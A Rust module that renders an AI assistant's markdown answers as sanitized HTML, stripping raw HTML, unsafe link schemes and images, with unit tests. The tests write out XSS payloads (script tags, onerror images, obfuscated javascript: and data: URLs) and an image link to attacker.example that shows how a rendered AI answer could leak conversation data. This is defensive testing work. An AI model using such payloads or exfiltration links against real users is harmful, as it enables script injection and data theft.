//! Markdown rendering of the AI assistant's answers (components/assistant.rs).
//!
//! The AI answers in markdown (tables, code blocks, lists); the drawer
//! used to show raw text. Markdown is detected heuristically, converted
//! to HTML with pulldown-cmark (tables + strikethrough), then injected
//! via `dangerous_inner_html` — styled by `.ai-md` (style/tailwind.css).
//!
//! XSS sanitization: pulldown-cmark does NOT filter raw HTML, so every
//! `Html`/`InlineHtml` parser event is dropped before rendering.
//! Ordinary text is escaped by the renderer.
//!
//! Links and images (R11, SEC-W1): pulldown-cmark does not filter URL
//! schemes. A link keeps its target only for `http(s):`, `mailto:` or a
//! relative URL — anything else (`javascript:`, `data:`…) renders as its
//! text. Images never load (a remote `![](…)` would leak the conversation on
//! render, zero click): only their alt text is shown.

use pulldown_cmark::{Event, Options, Parser, Tag, TagEnd};

/// URL a rendered link may point to: `http(s):`, `mailto:` or relative.
/// Browsers ignore ASCII whitespace / control characters inside a scheme
/// (`java\tscript:`), so they are stripped before the check.
fn safe_href(url: &str) -> bool {
    let cleaned: String = url
        .chars()
        .filter(|c| !c.is_ascii_whitespace() && !c.is_ascii_control())
        .collect();
    let lower = cleaned.to_ascii_lowercase();
    // A scheme is what precedes the first ':' — unless a '/', '?' or '#'
    // comes first (relative URL such as `/flows?id=1:2`).
    match lower.find(':') {
        None => true,
        Some(colon) => {
            if lower[..colon].contains(['/', '?', '#']) {
                return true;
            }
            matches!(&lower[..colon], "http" | "https" | "mailto")
        }
    }
}

/// Detection heuristic: does the answer contain markdown we want to
/// render (table, code, bold/italic, heading, list)? Otherwise the raw
/// text is shown as before — avoids turning a "1." in the middle of a
/// sentence or the `#` of an ID into a bogus structure.
pub fn looks_like_markdown(text: &str) -> bool {
    if text.contains("```") {
        return true;
    }
    for line in text.lines() {
        let trimmed = line.trim_start();
        // Table: separator row |---|---| or cells | a | b |
        if trimmed.starts_with('|') && trimmed.matches('|').count() >= 2 {
            return true;
        }
        if trimmed.starts_with('#') {
            return true;
        }
        if trimmed.starts_with("- ") || trimmed.starts_with("* ") {
            return true;
        }
        // Ordered list at line start (not "1.5" in the middle of a sentence).
        if trimmed.starts_with(|c: char| c.is_ascii_digit())
            && trimmed.contains(". ")
            && trimmed.find(". ") == Some(1)
        {
            return true;
        }
        if text.contains("**") || text.contains("__") {
            return true;
        }
        // Inline code `x` (pair of backticks on the same line).
        if text.matches('`').count() >= 2 {
            return true;
        }
    }
    false
}

/// Converts markdown to HTML. The raw HTML of the source (AI, hence
/// untrusted) is removed: only markdown elements are rendered.
pub fn to_html(text: &str) -> String {
    let mut options = Options::empty();
    options.insert(Options::ENABLE_TABLES);
    options.insert(Options::ENABLE_STRIKETHROUGH);
    // One entry per open link: was it dropped (unsafe target)?
    let mut links: Vec<bool> = Vec::new();
    let parser = Parser::new_ext(text, options).filter_map(move |event| match event {
        // Raw HTML dropped (sanitization); the text content of a code
        // block arrives as Event::Text, it is left untouched.
        Event::Html(_) | Event::InlineHtml(_) => None,
        Event::Start(Tag::Link { ref dest_url, .. }) => {
            let keep = safe_href(dest_url);
            links.push(!keep);
            keep.then_some(event)
        }
        Event::End(TagEnd::Link) => {
            let dropped = links.pop().unwrap_or(false);
            (!dropped).then_some(event)
        }
        // Images: the alt text (inner events) stays, the <img> never.
        Event::Start(Tag::Image { .. }) | Event::End(TagEnd::Image) => None,
        other => Some(other),
    });
    let mut html = String::with_capacity(text.len() + 64);
    pulldown_cmark::html::push_html(&mut html, parser);
    html
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detection_covers_common_shapes() {
        assert!(looks_like_markdown("| a | b |\n|---|---|\n| 1 | 2 |"));
        assert!(looks_like_markdown("voici :\n- un\n- deux"));
        assert!(looks_like_markdown("# Titre"));
        assert!(looks_like_markdown("du **gras** ici"));
        assert!(looks_like_markdown("du `code` inline"));
        assert!(looks_like_markdown("```rust\nfn main() {}\n```"));
    }

    #[test]
    fn plain_text_is_not_detected() {
        assert!(!looks_like_markdown("Bonjour, voici la liste des devices."));
        assert!(!looks_like_markdown("Il y a 1.5 mètre de câble."));
        assert!(!looks_like_markdown("device #2 est actif"));
        assert!(!looks_like_markdown(""));
    }

    #[test]
    fn html_raw_is_stripped() {
        // Tags are dropped; the text between tags stays shown,
        // escaped, as ordinary (inert) text.
        let html = to_html("texte <script>alert(1)</script> suite");
        assert!(!html.contains("<script"));
        assert!(html.contains("suite"));
        let html = to_html("<img src=x onerror=alert(1)> ok");
        assert!(!html.contains("<img"));
        assert!(html.contains("ok"));
    }

    #[test]
    fn unsafe_links_render_as_text() {
        for url in [
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "java\tscript:alert(1)",
            " javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:x",
        ] {
            let html = to_html(&format!("[Fix it]({url}) end"));
            assert!(!html.contains("<a"), "{url} kept: {html}");
            assert!(html.contains("Fix it"), "{url} lost its text: {html}");
        }
    }

    #[test]
    fn safe_links_are_kept() {
        for url in [
            "https://pnex.io/docs",
            "http://192.168.1.2:5150/",
            "mailto:ops@example.com",
            "/flows?id=12",
            "/flows?at=12:30",
            "#section",
        ] {
            let html = to_html(&format!("[go]({url})"));
            assert!(html.contains("<a href="), "{url} dropped: {html}");
        }
    }

    #[test]
    fn images_never_load() {
        let html = to_html("![leak](https://attacker.example/?q=secret) after");
        assert!(!html.contains("<img"));
        assert!(html.contains("leak"));
        assert!(html.contains("after"));
    }

    #[test]
    fn table_and_code_render() {
        let html = to_html("| a | b |\n|---|---|\n| 1 | 2 |");
        assert!(html.contains("<table>"));
        assert!(html.contains("<td>1</td>"));
        let html = to_html("```text\nligne 1\nligne 2\n```");
        assert!(html.contains("<pre>"));
        assert!(html.contains("ligne 1"));
    }
}
